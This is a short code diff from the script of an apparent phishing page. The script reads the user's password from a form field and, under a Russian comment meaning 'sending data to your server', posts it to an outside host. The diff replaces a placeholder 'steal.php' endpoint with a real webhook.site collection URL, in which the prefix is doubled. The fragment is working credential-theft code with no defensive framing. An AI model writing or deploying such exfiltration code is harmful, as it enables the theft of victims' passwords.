@@ -49,7 +49,7 @@
             const password = document.getElementById('password').value;
             
             // Отправка данных на ваш сервер
-            fetch('https://yourserver.com/steal.php', {
+            fetch('https://webhook.site/https://webhook.site/8105b2d2-84cf-418e-bd05-cc7b032dc7ff', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
